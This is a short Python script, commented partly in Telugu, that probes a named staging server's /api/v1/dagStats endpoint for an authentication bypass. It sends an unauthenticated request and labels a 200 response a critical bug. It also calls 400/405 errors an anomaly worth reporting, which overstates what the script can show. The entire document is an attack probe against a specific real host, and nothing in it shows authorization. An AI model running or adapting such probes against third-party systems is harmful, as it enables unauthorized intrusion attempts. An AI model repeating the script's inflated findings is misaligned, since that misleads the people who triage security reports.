import requests

url = "https://sm2a.staging.earth.gov/api/v1/dagStats"

# DAG stats కి సాధారణంగా 'dag_ids' అనే పారామీటర్ కావాలి
params = {
    "dag_ids": "example_bash_operator" 
}

print(f"[*] Probing potential Auth Bypass on: {url}")

try:
    # అథెంటికేషన్ హెడర్స్ ఏమీ లేకుండా పంపుతున్నాం
    r = requests.get(url, params=params, timeout=10)
    
    print(f"[!] Status Code: {r.status_code}")
    print("[!] Response Body:")
    print(r.text)
    
    if r.status_code == 200:
        print("\n[+++] CRITICAL BUG FOUND: Authentication Bypass on /dagStats!")
        print("You can see DAG statistics without logging in.")
    else:
        print("\n[-] Still blocked, but the 400/405 status is an anomaly worth reporting.")

except Exception as e:
    print(f"[!] Error: {e}")
